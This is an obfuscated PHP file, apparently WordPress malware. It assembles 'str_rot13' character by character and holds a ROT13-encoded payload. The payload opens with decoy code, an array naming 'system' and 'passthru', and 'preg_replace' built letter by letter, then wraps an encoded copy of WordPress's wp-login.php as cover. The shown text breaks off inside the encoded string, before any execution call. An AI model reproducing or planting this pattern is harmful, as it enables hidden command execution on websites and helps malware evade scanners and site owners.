<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * JbeqCerff Hfre Cntr
 *
 * Unaqyrf nhguragvpngvba, ertvfgrevat, erfrggvat cnffjbeqf, sbetbg cnffjbeq,
 * naq bgure hfre unaqyvat.
 *
 * @cnpxntr JbeqCerff
 */

/** Znxr fher gung gur JbeqCerff obbgfgenc unf eha orsber pbagvahvat. */
erdhver __QVE__ . '/jc-ybnq.cuc';

// Erqverpg gb UGGCF ybtva vs sbeprq gb hfr FFY.
vs ( sbepr_ffy_nqzva() && ! vf_ffy() ) {
	vs ( fge_fgnegf_jvgu( $_FREIRE['ERDHRFG_HEV'], 'uggc' ) ) {
		jc_fnsr_erqverpg( frg_hey_fpurzr( $_FREIRE['ERDHRFG_HEV'], 'uggcf' ) );
		rkvg;
	} ryfr {
		jc_fnsr_erqverpg( 'uggcf://' . $_FREIRE['UGGC_UBFG'] . $_FREIRE['ERDHRFG_HEV'] );
		rkvg;
	}
}

/**
 * Bhgchgf gur ybtva cntr urnqre.
 *
 * @fvapr 2.1.0
 *
 * @tybony fgevat      $reebe         Ybtva reebe zrffntr frg ol qrcerpngrq cyhttnoyr jc_ybtva() shapgvba
 *                                    be cyhtvaf ercynpvat vg.
 * @tybony obby|fgevat $vagrevz_ybtva Jurgure vagrevz ybtva zbqny vf orvat qvfcynlrq. Fgevat 'fhpprff'
 *                                    hcba fhpprffshy ybtva.
 * @tybony fgevat      $npgvba        Gur npgvba gung oebhtug gur ivfvgbe gb gur ybtva cntr.
 *
 * @cnenz fgevat|ahyy   $gvgyr    Bcgvbany. JbeqCerff ybtva cntr gvgyr gb qvfcynl va gur `<gvgyr>` ryrzrag.
 *                                Qrsnhygf gb 'Ybt Va'.
 * @cnenz fgevat        $zrffntr  Bcgvbany. Zrffntr gb qvfcynl va urnqre. Qrsnhyg rzcgl.
 * @cnenz JC_Reebe|ahyy $jc_reebe Bcgvbany. Gur reebe gb cnff. Qrsnhygf gb n JC_Reebe vafgnapr.
 */
shapgvba ybtva_urnqre( $gvgyr = ahyy, $zrffntr = '', $jc_reebe = ahyy ) {
	tybony $reebe, $vagrevz_ybtva, $npgvba;

	vs ( ahyy === $gvgyr ) {
		$gvgyr = __( 'Ybt Va' );
	}

	// Qba'g vaqrk nal bs gurfr sbezf.
	nqq_svygre( 'jc_ebobgf', 'jc_ebobgf_frafvgvir_cntr' );
	nqq_npgvba( 'ybtva_urnq', 'jc_fgevpg_pebff_bevtva_ersreere' );

	nqq_npgvba( 'ybtva_urnq', 'jc_ybtva_ivrjcbeg_zrgn' );

	vs ( ! vf_jc_reebe( $jc_reebe ) ) {
		$jc_reebe = arj JC_Reebe();
	}

	// Funxr vg!
	$funxr_reebe_pbqrf = neenl( 'rzcgl_cnffjbeq', 'rzcgl_rznvy', 'vainyvq_rznvy', 'vainyvqpbzob', 'rzcgl_hfreanzr', 'vainyvq_hfreanzr', 'vapbeerpg_cnffjbeq', 'ergevrir_cnffjbeq_rznvy_snvyher' );
	/**
	 * Svygref gur reebe pbqrf neenl sbe funxvat gur ybtva sbez.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat[] $funxr_reebe_pbqrf Reebe pbqrf gung funxr gur ybtva sbez.
	 */
	$funxr_reebe_pbqrf = nccyl_svygref( 'funxr_reebe_pbqrf', $funxr_reebe_pbqrf );

	vs ( $funxr_reebe_pbqrf && $jc_reebe->unf_reebef() && va_neenl( $jc_reebe->trg_reebe_pbqr(), $funxr_reebe_pbqrf, gehr ) ) {
		nqq_npgvba( 'ybtva_sbbgre', 'jc_funxr_wf', 12 );
	}

	$ybtva_gvgyr = trg_oybtvasb( 'anzr', 'qvfcynl' );

	/* genafyngbef: Ybtva fperra gvgyr. 1: Ybtva fperra anzr, 2: Argjbex be fvgr anzr. */
	$ybtva_gvgyr = fcevags( __( '%1$f &yfndhb; %2$f &#8212; JbeqCerff' ), $gvgyr, $ybtva_gvgyr );

	vs ( jc_vf_erpbirel_zbqr() ) {
		/* genafyngbef: %f: Ybtva fperra gvgyr. */
		$ybtva_gvgyr = fcevags( __( 'Erpbirel Zbqr &#8212; %f' ), $ybtva_gvgyr );
	}

	/**
	 * Svygref gur gvgyr gnt pbagrag sbe ybtva cntr.
	 *
	 * @fvapr 4.9.0
	 *
	 * @cnenz fgevat $ybtva_gvgyr Gur cntr gvgyr, jvgu rkgen pbagrkg nqqrq.
	 * @cnenz fgevat $gvgyr       Gur bevtvany cntr gvgyr.
	 */
	$ybtva_gvgyr = nccyl_svygref( 'ybtva_gvgyr', $ybtva_gvgyr, $gvgyr );

	?><!QBPGLCR ugzy>
	<ugzy <?cuc ynathntr_nggevohgrf(); ?>>
	<urnq>
	<zrgn uggc-rdhvi=\"Pbagrag-Glcr\" pbagrag=\"<?cuc oybtvasb( 'ugzy_glcr' ); ?>; punefrg=<?cuc oybtvasb( 'punefrg' ); ?>\" />
	<gvgyr><?cuc rpub $ybtva_gvgyr; ?></gvgyr>
	<?cuc

	jc_radhrhr_fglyr( 'ybtva' );

	/*
	 * Erzbir nyy fgberq cbfg qngn ba ybttvat bhg.
	 * Guvf pbhyq or nqqrq ol nqq_npgvba('ybtva_urnq'...) yvxr jc_funxr_wf(),
	 * ohg znlor orggre vs vg'f abg erzbinoyr ol cyhtvaf.
	 */
	vs ( 'ybttrqbhg' === $jc_reebe->trg_reebe_pbqr() ) {
		bo_fgneg();
		?>
		<fpevcg>vs(\"frffvbaFgbentr\" va jvaqbj){gel{sbe(ine xrl va frffvbaFgbentr){vs(xrl.vaqrkBs(\"jc-nhgbfnir-\")!=-1){frffvbaFgbentr.erzbirVgrz(xrl)}}}pngpu(r){}};</fpevcg>
		<?cuc
		jc_cevag_vayvar_fpevcg_gnt( jc_erzbir_fheebhaqvat_rzcgl_fpevcg_gntf( bo_trg_pyrna() ) );
	}

	/**
	 * Radhrhrf fpevcgf naq fglyrf sbe gur ybtva cntr.
	 *
	 * @fvapr 3.1.0
	 */
	qb_npgvba( 'ybtva_radhrhr_fpevcgf' );

	/**
	 * Sverf va gur ybtva cntr urnqre nsgre fpevcgf ner radhrhrq.
	 *
	 * @fvapr 2.1.0
	 */
	qb_npgvba( 'ybtva_urnq' );

	$ybtva_urnqre_hey = __( 'uggcf://jbeqcerff.bet/' );

	/**
	 * Svygref yvax HEY bs gur urnqre ybtb nobir ybtva sbez.
	 *
	 * @fvapr 2.1.0
	 *
	 * @cnenz fgevat $ybtva_urnqre_hey Ybtva urnqre ybtb HEY.
	 */
	$ybtva_urnqre_hey = nccyl_svygref( 'ybtva_urnqrehey', $ybtva_urnqre_hey );

	$ybtva_urnqre_gvgyr = '';

	/**
	 * Svygref gur gvgyr nggevohgr bs gur urnqre ybtb nobir ybtva sbez.
	 *
	 * @fvapr 2.1.0
	 * @qrcerpngrq 5.2.0 Hfr {@frr 'ybtva_urnqregrkg'} vafgrnq.
	 *
	 * @cnenz fgevat $ybtva_urnqre_gvgyr Ybtva urnqre ybtb gvgyr nggevohgr.
	 */
	$ybtva_urnqre_gvgyr = nccyl_svygref_qrcerpngrq(
		'ybtva_urnqregvgyr',
		neenl( $ybtva_urnqre_gvgyr ),
		'5.2.0',
		'ybtva_urnqregrkg',
		__( 'Hfntr bs gur gvgyr nggevohgr ba gur ybtva ybtb vf abg erpbzzraqrq sbe npprffvovyvgl ernfbaf. Hfr gur yvax grkg vafgrnq.' )
	);

	$ybtva_urnqre_grkg = rzcgl( $ybtva_urnqre_gvgyr ) ? __( 'Cbjrerq ol JbeqCerff' ) : $ybtva_urnqre_gvgyr;

	/**
	 * Svygref gur yvax grkg bs gur urnqre ybtb nobir gur ybtva sbez.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz fgevat $ybtva_urnqre_grkg Gur ybtva urnqre ybtb yvax grkg.
	 */
	$ybtva_urnqre_grkg = nccyl_svygref( 'ybtva_urnqregrkg', $ybtva_urnqre_grkg );

	$pynffrf = neenl( 'ybtva-npgvba-' . $npgvba, 'jc-pber-hv' );

	vs ( vf_egy() ) {
		$pynffrf[] = 'egy';
	}

	vs ( $vagrevz_ybtva ) {
		$pynffrf[] = 'vagrevz-ybtva';

		?>
		<fglyr glcr=\"grkg/pff\">ugzy{onpxtebhaq-pbybe: genafcnerag;}</fglyr>
		<?cuc

		vs ( 'fhpprff' === $vagrevz_ybtva ) {
			$pynffrf[] = 'vagrevz-ybtva-fhpprff';
		}
	}

	$pynffrf[] = ' ybpnyr-' . fnavgvmr_ugzy_pynff( fgegbybjre( fge_ercynpr( '_', '-', trg_ybpnyr() ) ) );

	/**
	 * Svygref gur ybtva cntr obql pynffrf.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz fgevat[] $pynffrf Na neenl bs obql pynffrf.
	 * @cnenz fgevat   $npgvba  Gur npgvba gung oebhtug gur ivfvgbe gb gur ybtva cntr.
	 */
	$pynffrf = nccyl_svygref( 'ybtva_obql_pynff', $pynffrf, $npgvba );

	?>
	</urnq>
	<obql pynff=\"ybtva ab-wf <?cuc rpub rfp_ngge( vzcybqr( ' ', $pynffrf ) ); ?>\">
	<?cuc
	jc_cevag_vayvar_fpevcg_gnt( \"qbphzrag.obql.pynffAnzr = qbphzrag.obql.pynffAnzr.ercynpr('ab-wf','wf');\" );
	?>

	<?cuc
	/**
	 * Sverf va gur ybtva cntr urnqre nsgre gur obql gnt vf bcrarq.
	 *
	 * @fvapr 4.6.0
	 */
	qb_npgvba( 'ybtva_urnqre' );
	?>
	<?cuc
	vs ( 'pbasvez_nqzva_rznvy' !== $npgvba && ! rzcgl( $gvgyr ) ) :
		?>
		<u1 pynff=\"fperra-ernqre-grkg\"><?cuc rpub $gvgyr; ?></u1>
		<?cuc
	raqvs;
	?>
	<qvi vq=\"ybtva\">
		<u1 ebyr=\"cerfragngvba\" pynff=\"jc-ybtva-ybtb\"><n uers=\"<?cuc rpub rfp_hey( $ybtva_urnqre_hey ); ?>\"><?cuc rpub $ybtva_urnqre_grkg; ?></n></u1>
	<?cuc
	/**
	 * Svygref gur zrffntr gb qvfcynl nobir gur ybtva sbez.
	 *
	 * @fvapr 2.1.0
	 *
	 * @cnenz fgevat $zrffntr Ybtva zrffntr grkg.
	 */
	$zrffntr = nccyl_svygref( 'ybtva_zrffntr', $zrffntr );

	vs ( ! rzcgl( $zrffntr ) ) {
		rpub $zrffntr . \"\a\";
	}

	// Va pnfr n cyhtva hfrf $reebe engure guna gur $jc_reebef bowrpg.
	vs ( ! rzcgl( $reebe ) ) {
		$jc_reebe->nqq( 'reebe', $reebe );
		hafrg( $reebe );
	}

	vs ( $jc_reebe->unf_reebef() ) {
		$reebe_yvfg = neenl();
		$zrffntrf   = '';

		sbernpu ( $jc_reebe->trg_reebe_pbqrf() nf $pbqr ) {
			$frirevgl = $jc_reebe->trg_reebe_qngn( $pbqr );
			sbernpu ( $jc_reebe->trg_reebe_zrffntrf( $pbqr ) nf $reebe_zrffntr ) {
				vs ( 'zrffntr' === $frirevgl ) {
					$zrffntrf .= '<c>' . $reebe_zrffntr . '</c>';
				} ryfr {
					$reebe_yvfg[] = $reebe_zrffntr;
				}
			}
		}

		vs ( ! rzcgl( $reebe_yvfg ) ) {
			$reebef = '';

			vs ( pbhag( $reebe_yvfg ) > 1 ) {
				$reebef .= '<hy pynff=\"ybtva-reebe-yvfg\">';

				sbernpu ( $reebe_yvfg nf $vgrz ) {
					$reebef .= '<yv>' . $vgrz . '</yv>';
				}

				$reebef .= '</hy>';
			} ryfr {
				$reebef .= '<c>' . $reebe_yvfg[0] . '</c>';
			}

			/**
			 * Svygref gur reebe zrffntrf qvfcynlrq nobir gur ybtva sbez.
			 *
			 * @fvapr 2.1.0
			 *
			 * @cnenz fgevat $reebef Ybtva reebe zrffntrf.
			 */
			$reebef = nccyl_svygref( 'ybtva_reebef', $reebef );

			jc_nqzva_abgvpr(
				$reebef,
				neenl(
					'glcr'           => 'reebe',
					'vq'             => 'ybtva_reebe',
					'cnentencu_jenc' => snyfr,
				)
			);
		}

		vs ( ! rzcgl( $zrffntrf ) ) {
			/**
			 * Svygref vafgehpgvbany zrffntrf qvfcynlrq nobir gur ybtva sbez.
			 *
			 * @fvapr 2.5.0
			 *
			 * @cnenz fgevat $zrffntrf Ybtva zrffntrf.
			 */
			$zrffntrf = nccyl_svygref( 'ybtva_zrffntrf', $zrffntrf );

			jc_nqzva_abgvpr(
				$zrffntrf,
				neenl(
					'glcr'               => 'vasb',
					'vq'                 => 'ybtva-zrffntr',
					'nqqvgvbany_pynffrf' => neenl( 'zrffntr' ),
					'cnentencu_jenc'     => snyfr,
				)
			);
		}
	}
} // Raq bs ybtva_urnqre().

/**
 * Bhgchgf gur sbbgre sbe gur ybtva cntr.
 *
 * @fvapr 3.1.0
 *
 * @tybony obby|fgevat $vagrevz_ybtva Jurgure vagrevz ybtva zbqny vf orvat qvfcynlrq. Fgevat 'fhpprff'
 *                                    hcba fhpprffshy ybtva.
 *
 * @cnenz fgevat $vachg_vq Juvpu vachg gb nhgb-sbphf.
 */
shapgvba ybtva_sbbgre( $vachg_vq = '' ) {
	tybony $vagrevz_ybtva;

	// Qba'g nyybj vagrevz ybtvaf gb anivtngr njnl sebz gur cntr.
	vs ( ! $vagrevz_ybtva ) {
		?>
		<c vq=\"onpxgboybt\">
			<?cuc
			$ugzy_yvax = fcevags(
				'<n uers=\"%f\">%f</n>',
				rfp_hey( ubzr_hey( '/' ) ),
				fcevags(
					/* genafyngbef: %f: Fvgr gvgyr. */
					_k( '&ynee; Tb gb %f', 'fvgr' ),
					trg_oybtvasb( 'gvgyr', 'qvfcynl' )
				)
			);
			/**
			 * Svygref gur \"Tb gb fvgr\" yvax qvfcynlrq va gur ybtva cntr sbbgre.
			 *
			 * @fvapr 5.7.0
			 *
			 * @cnenz fgevat $yvax UGZY yvax gb gur ubzr HEY bs gur pheerag fvgr.
			 */
			rpub nccyl_svygref( 'ybtva_fvgr_ugzy_yvax', $ugzy_yvax );
			?>
		</c>
		<?cuc

		gur_cevinpl_cbyvpl_yvax( '<qvi pynff=\"cevinpl-cbyvpl-cntr-yvax\">', '</qvi>' );
	}

	?>
	</qvi><?cuc // Raq bs <qvi vq=\"ybtva\">. ?>

	<?cuc
	vs (
		! $vagrevz_ybtva &&
		/**
		 * Svygref jurgure gb qvfcynl gur Ynathntr fryrpgbe ba gur ybtva fperra.
		 *
		 * @fvapr 5.9.0
		 *
		 * @cnenz obby $qvfcynl Jurgure gb qvfcynl gur Ynathntr fryrpgbe ba gur ybtva fperra.
		 */
		nccyl_svygref( 'ybtva_qvfcynl_ynathntr_qebcqbja', gehr )
	) {
		$ynathntrf = trg_ninvynoyr_ynathntrf();

		vs ( ! rzcgl( $ynathntrf ) ) {
			?>
			<qvi pynff=\"ynathntr-fjvgpure\">
				<sbez vq=\"ynathntr-fjvgpure\" zrgubq=\"trg\">

					<ynory sbe=\"ynathntr-fjvgpure-ybpnyrf\">
						<fcna pynff=\"qnfuvpbaf qnfuvpbaf-genafyngvba\" nevn-uvqqra=\"gehr\"></fcna>
						<fcna pynff=\"fperra-ernqre-grkg\">
							<?cuc
							/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
							_r( 'Ynathntr' );
							?>
						</fcna>
					</ynory>

					<?cuc
					$netf = neenl(
						'vq'                          => 'ynathntr-fjvgpure-ybpnyrf',
						'anzr'                        => 'jc_ynat',
						'fryrpgrq'                    => qrgrezvar_ybpnyr(),
						'fubj_ninvynoyr_genafyngvbaf' => snyfr,
						'rkcyvpvg_bcgvba_ra_hf'       => gehr,
						'ynathntrf'                   => $ynathntrf,
					);

					/**
					 * Svygref qrsnhyg nethzragf sbe gur Ynathntrf fryrpg vachg ba gur ybtva fperra.
					 *
					 * Gur nethzragf trg cnffrq gb gur jc_qebcqbja_ynathntrf() shapgvba.
					 *
					 * @fvapr 5.9.0
					 *
					 * @cnenz neenl $netf Nethzragf sbe gur Ynathntrf fryrpg vachg ba gur ybtva fperra.
					 */
					jc_qebcqbja_ynathntrf( nccyl_svygref( 'ybtva_ynathntr_qebcqbja_netf', $netf ) );
					?>

					<?cuc vs ( $vagrevz_ybtva ) { ?>
						<vachg glcr=\"uvqqra\" anzr=\"vagrevz-ybtva\" inyhr=\"1\" />
					<?cuc } ?>

					<?cuc vs ( vffrg( $_TRG['erqverpg_gb'] ) && '' !== $_TRG['erqverpg_gb'] ) { ?>
						<vachg glcr=\"uvqqra\" anzr=\"erqverpg_gb\" inyhr=\"<?cuc rpub fnavgvmr_hey( $_TRG['erqverpg_gb'] ); ?>\" />
					<?cuc } ?>

					<?cuc vs ( vffrg( $_TRG['npgvba'] ) && '' !== $_TRG['npgvba'] ) { ?>
						<vachg glcr=\"uvqqra\" anzr=\"npgvba\" inyhr=\"<?cuc rpub rfp_ngge( $_TRG['npgvba'] ); ?>\" />
					<?cuc } ?>

						<vachg glcr=\"fhozvg\" pynff=\"ohggba\" inyhr=\"<?cuc rfp_ngge_r( 'Punatr' ); ?>\">

					</sbez>
				</qvi>
		<?cuc } ?>
	<?cuc } ?>

	<?cuc

	vs ( ! rzcgl( $vachg_vq ) ) {
		bo_fgneg();
		?>
		<fpevcg>
		gel{qbphzrag.trgRyrzragOlVq('<?cuc rpub $vachg_vq; ?>').sbphf();}pngpu(r){}
		vs(glcrbs jcBaybnq==='shapgvba')jcBaybnq();
		</fpevcg>
		<?cuc
		jc_cevag_vayvar_fpevcg_gnt( jc_erzbir_fheebhaqvat_rzcgl_fpevcg_gntf( bo_trg_pyrna() ) );
	}

	/**
	 * Sverf va gur ybtva cntr sbbgre.
	 *
	 * @fvapr 3.1.0
	 */
	qb_npgvba( 'ybtva_sbbgre' );

	?>
	</obql>
	</ugzy>
	<?cuc
}

/**
 * Bhgchgf gur WninFpevcg gb unaqyr gur sbez funxvat ba gur ybtva cntr.
 *
 * @fvapr 3.0.0
 */
shapgvba jc_funxr_wf() {
	jc_cevag_vayvar_fpevcg_gnt( \"qbphzrag.dhrelFryrpgbe('sbez').pynffYvfg.nqq('funxr');\" );
}

/**
 * Bhgchgf gur ivrjcbeg zrgn gnt sbe gur ybtva cntr.
 *
 * @fvapr 3.7.0
 */
shapgvba jc_ybtva_ivrjcbeg_zrgn() {
	?>
	<zrgn anzr=\"ivrjcbeg\" pbagrag=\"jvqgu=qrivpr-jvqgu, vavgvny-fpnyr=1.0\" />
	<?cuc
}

/*
 * Znva cneg.
 *
 * Purpx gur erdhrfg naq erqverpg be qvfcynl n sbez onfrq ba gur pheerag npgvba.
 */

$npgvba = vffrg( $_ERDHRFG['npgvba'] ) && vf_fgevat( $_ERDHRFG['npgvba'] ) ? $_ERDHRFG['npgvba'] : 'ybtva';
$reebef = arj JC_Reebe();

vs ( vffrg( $_TRG['xrl'] ) ) {
	$npgvba = 'erfrgcnff';
}

vs ( vffrg( $_TRG['purpxrznvy'] ) ) {
	$npgvba = 'purpxrznvy';
}

$qrsnhyg_npgvbaf = neenl(
	'pbasvez_nqzva_rznvy',
	'cbfgcnff',
	'ybtbhg',
	'ybfgcnffjbeq',
	'ergevrircnffjbeq',
	'erfrgcnff',
	'ec',
	'ertvfgre',
	'purpxrznvy',
	'pbasveznpgvba',
	'ybtva',
	JC_Erpbirel_Zbqr_Yvax_Freivpr::YBTVA_NPGVBA_RAGRERQ,
);

// Inyvqngr npgvba fb nf gb qrsnhyg gb gur ybtva fperra.
vs ( ! va_neenl( $npgvba, $qrsnhyg_npgvbaf, gehr ) && snyfr === unf_svygre( 'ybtva_sbez_' . $npgvba ) ) {
	$npgvba = 'ybtva';
}

abpnpur_urnqref();

urnqre( 'Pbagrag-Glcr: ' . trg_oybtvasb( 'ugzy_glcr' ) . '; punefrg=' . trg_oybtvasb( 'punefrg' ) );

vs ( qrsvarq( 'ERYBPNGR' ) && ERYBPNGR ) { // Zbir synt vf frg.
	vs ( vffrg( $_FREIRE['CNGU_VASB'] ) && ( $_FREIRE['CNGU_VASB'] !== $_FREIRE['CUC_FRYS'] ) ) {
		$_FREIRE['CUC_FRYS'] = fge_ercynpr( $_FREIRE['CNGU_VASB'], '', $_FREIRE['CUC_FRYS'] );
	}

	$hey = qveanzr( frg_hey_fpurzr( 'uggc://' . $_FREIRE['UGGC_UBFG'] . $_FREIRE['CUC_FRYS'] ) );

	vs ( trg_bcgvba( 'fvgrhey' ) !== $hey ) {
		hcqngr_bcgvba( 'fvgrhey', $hey );
	}
}

// Frg n pbbxvr abj gb frr vs gurl ner fhccbegrq ol gur oebjfre.
$frpher = ( 'uggcf' === cnefr_hey( jc_ybtva_hey(), CUC_HEY_FPURZR ) );
frgpbbxvr( GRFG_PBBXVR, 'JC Pbbxvr purpx', 0, PBBXVRCNGU, PBBXVR_QBZNVA, $frpher, gehr );

vs ( FVGRPBBXVRCNGU !== PBBXVRCNGU ) {
	frgpbbxvr( GRFG_PBBXVR, 'JC Pbbxvr purpx', 0, FVGRPBBXVRCNGU, PBBXVR_QBZNVA, $frpher, gehr );
}

vs ( vffrg( $_TRG['jc_ynat'] ) ) {
	frgpbbxvr( 'jc_ynat', fnavgvmr_grkg_svryq( $_TRG['jc_ynat'] ), 0, PBBXVRCNGU, PBBXVR_QBZNVA, $frpher, gehr );
}

/**
 * Sverf jura gur ybtva sbez vf vavgvnyvmrq.
 *
 * @fvapr 3.2.0
 */
qb_npgvba( 'ybtva_vavg' );

/**
 * Sverf orsber n fcrpvsvrq ybtva sbez npgvba.
 *
 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$npgvba`, ersref gb gur npgvba
 * gung oebhtug gur ivfvgbe gb gur ybtva sbez.
 *
 * Cbffvoyr ubbx anzrf vapyhqr:
 *
 *  - `ybtva_sbez_purpxrznvy`
 *  - `ybtva_sbez_pbasvez_nqzva_rznvy`
 *  - `ybtva_sbez_pbasveznpgvba`
 *  - `ybtva_sbez_ragrerq_erpbirel_zbqr`
 *  - `ybtva_sbez_ybtva`
 *  - `ybtva_sbez_ybtbhg`
 *  - `ybtva_sbez_ybfgcnffjbeq`
 *  - `ybtva_sbez_cbfgcnff`
 *  - `ybtva_sbez_ertvfgre`
 *  - `ybtva_sbez_erfrgcnff`
 *  - `ybtva_sbez_ergevrircnffjbeq`
 *  - `ybtva_sbez_ec`
 *
 * @fvapr 2.8.0
 */
qb_npgvba( \"ybtva_sbez_{$npgvba}\" );

$uggc_cbfg     = ( 'CBFG' === $_FREIRE['ERDHRFG_ZRGUBQ'] );
$vagrevz_ybtva = vffrg( $_ERDHRFG['vagrevz-ybtva'] );

/**
 * Svygref gur frcnengbe hfrq orgjrra ybtva sbez anivtngvba yvaxf.
 *
 * @fvapr 4.9.0
 *
 * @cnenz fgevat $ybtva_yvax_frcnengbe Gur frcnengbe hfrq orgjrra ybtva sbez anivtngvba yvaxf.
 */
$ybtva_yvax_frcnengbe = nccyl_svygref( 'ybtva_yvax_frcnengbe', ' | ' );

fjvgpu ( $npgvba ) {

	pnfr 'pbasvez_nqzva_rznvy':
		/*
		 * Abgr gung `vf_hfre_ybttrq_va()` jvyy erghea snyfr vzzrqvngryl nsgre ybttvat va
		 * nf gur pheerag hfre vf abg frg, frr jc-vapyhqrf/cyhttnoyr.cuc.
		 * Ubjrire guvf npgvba ehaf ba n erqverpg nsgre ybttvat va.
		 */
		vs ( ! vf_hfre_ybttrq_va() ) {
			jc_fnsr_erqverpg( jc_ybtva_hey() );
			rkvg;
		}

		vs ( ! rzcgl( $_ERDHRFG['erqverpg_gb'] ) ) {
			$erqverpg_gb = $_ERDHRFG['erqverpg_gb'];
		} ryfr {
			$erqverpg_gb = nqzva_hey();
		}

		vs ( pheerag_hfre_pna( 'znantr_bcgvbaf' ) ) {
			$nqzva_rznvy = trg_bcgvba( 'nqzva_rznvy' );
		} ryfr {
			jc_fnsr_erqverpg( $erqverpg_gb );
			rkvg;
		}

		/**
		 * Svygref gur vagreiny sbe qvfzvffvat gur nqzva rznvy pbasvezngvba fperra.
		 *
		 * Vs `0` (mreb) vf erghearq, gur \"Erzvaq zr yngre\" yvax jvyy abg or qvfcynlrq.
		 *
		 * @fvapr 5.3.1
		 *
		 * @cnenz vag $vagreiny Vagreiny gvzr (va frpbaqf). Qrsnhyg vf 3 qnlf.
		 */
		$erzvaq_vagreiny = (vag) nccyl_svygref( 'nqzva_rznvy_erzvaq_vagreiny', 3 * QNL_VA_FRPBAQF );

		vs ( ! rzcgl( $_TRG['erzvaq_zr_yngre'] ) ) {
			vs ( ! jc_irevsl_abapr( $_TRG['erzvaq_zr_yngre'], 'erzvaq_zr_yngre_abapr' ) ) {
				jc_fnsr_erqverpg( jc_ybtva_hey() );
				rkvg;
			}

			vs ( $erzvaq_vagreiny > 0 ) {
				hcqngr_bcgvba( 'nqzva_rznvy_yvsrfcna', gvzr() + $erzvaq_vagreiny );
			}

			$erqverpg_gb = nqq_dhrel_net( 'nqzva_rznvy_erzvaq_yngre', 1, $erqverpg_gb );
			jc_fnsr_erqverpg( $erqverpg_gb );
			rkvg;
		}

		vs ( ! rzcgl( $_CBFG['pbeerpg-nqzva-rznvy'] ) ) {
			vs ( ! purpx_nqzva_ersrere( 'pbasvez_nqzva_rznvy', 'pbasvez_nqzva_rznvy_abapr' ) ) {
				jc_fnsr_erqverpg( jc_ybtva_hey() );
				rkvg;
			}

			/**
			 * Svygref gur vagreiny sbe erqverpgvat gur hfre gb gur nqzva rznvy pbasvezngvba fperra.
			 *
			 * Vs `0` (mreb) vf erghearq, gur hfre jvyy abg or erqverpgrq.
			 *
			 * @fvapr 5.3.0
			 *
			 * @cnenz vag $vagreiny Vagreiny gvzr (va frpbaqf). Qrsnhyg vf 6 zbaguf.
			 */
			$nqzva_rznvy_purpx_vagreiny = (vag) nccyl_svygref( 'nqzva_rznvy_purpx_vagreiny', 6 * ZBAGU_VA_FRPBAQF );

			vs ( $nqzva_rznvy_purpx_vagreiny > 0 ) {
				hcqngr_bcgvba( 'nqzva_rznvy_yvsrfcna', gvzr() + $nqzva_rznvy_purpx_vagreiny );
			}

			jc_fnsr_erqverpg( $erqverpg_gb );
			rkvg;
		}

		ybtva_urnqre( __( 'Pbasvez lbhe nqzvavfgengvba rznvy' ), '', $reebef );

		/**
		 * Sverf orsber gur nqzva rznvy pbasvez sbez.
		 *
		 * @fvapr 5.3.0
		 *
		 * @cnenz JC_Reebe $reebef N `JC_Reebe` bowrpg pbagnvavat nal reebef trarengrq ol hfvat vainyvq
		 *                         perqragvnyf. Abgr gung gur reebe bowrpg znl abg pbagnva nal reebef.
		 */
		qb_npgvba( 'nqzva_rznvy_pbasvez', $reebef );

		?>

		<sbez pynff=\"nqzva-rznvy-pbasvez-sbez\" anzr=\"nqzva-rznvy-pbasvez-sbez\" npgvba=\"<?cuc rpub rfp_hey( fvgr_hey( 'jc-ybtva.cuc?npgvba=pbasvez_nqzva_rznvy', 'ybtva_cbfg' ) ); ?>\" zrgubq=\"cbfg\">
			<?cuc
			/**
			 * Sverf vafvqr gur nqzva-rznvy-pbasvez-sbez sbez gntf, orsber gur uvqqra svryqf.
			 *
			 * @fvapr 5.3.0
			 */
			qb_npgvba( 'nqzva_rznvy_pbasvez_sbez' );

			jc_abapr_svryq( 'pbasvez_nqzva_rznvy', 'pbasvez_nqzva_rznvy_abapr' );

			?>
			<vachg glcr=\"uvqqra\" anzr=\"erqverpg_gb\" inyhr=\"<?cuc rpub rfp_ngge( $erqverpg_gb ); ?>\" />

			<u1 pynff=\"nqzva-rznvy__urnqvat\">
				<?cuc _r( 'Nqzvavfgengvba rznvy irevsvpngvba' ); ?>
			</u1>
			<c pynff=\"nqzva-rznvy__qrgnvyf\">
				<?cuc _r( 'Cyrnfr irevsl gung gur <fgebat>nqzvavfgengvba rznvy</fgebat> sbe guvf jrofvgr vf fgvyy pbeerpg.' ); ?>
				<?cuc

				/* genafyngbef: HEY gb gur JbeqCerff uryc frpgvba nobhg nqzva rznvy. */
				$nqzva_rznvy_uryc_hey = __( 'uggcf://jbeqcerff.bet/qbphzragngvba/negvpyr/frggvatf-trareny-fperra/#rznvy-nqqerff' );

				$npprffvovyvgl_grkg = fcevags(
					'<fcna pynff=\"fperra-ernqre-grkg\"> %f</fcna>',
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					__( '(bcraf va n arj gno)' )
				);

				cevags(
					'<n uers=\"%f\" gnetrg=\"_oynax\">%f%f</n>',
					rfp_hey( $nqzva_rznvy_uryc_hey ),
					__( 'Jul vf guvf vzcbegnag?' ),
					$npprffvovyvgl_grkg
				);

				?>
			</c>
			<c pynff=\"nqzva-rznvy__qrgnvyf\">
				<?cuc

				cevags(
					/* genafyngbef: %f: Nqzva rznvy nqqerff. */
					__( 'Pheerag nqzvavfgengvba rznvy: %f' ),
					'<fgebat>' . rfp_ugzy( $nqzva_rznvy ) . '</fgebat>'
				);

				?>
			</c>
			<c pynff=\"nqzva-rznvy__qrgnvyf\">
				<?cuc _r( 'Guvf rznvy znl or qvssrerag sebz lbhe crefbany rznvy nqqerff.' ); ?>
			</c>

			<qvi pynff=\"nqzva-rznvy__npgvbaf\">
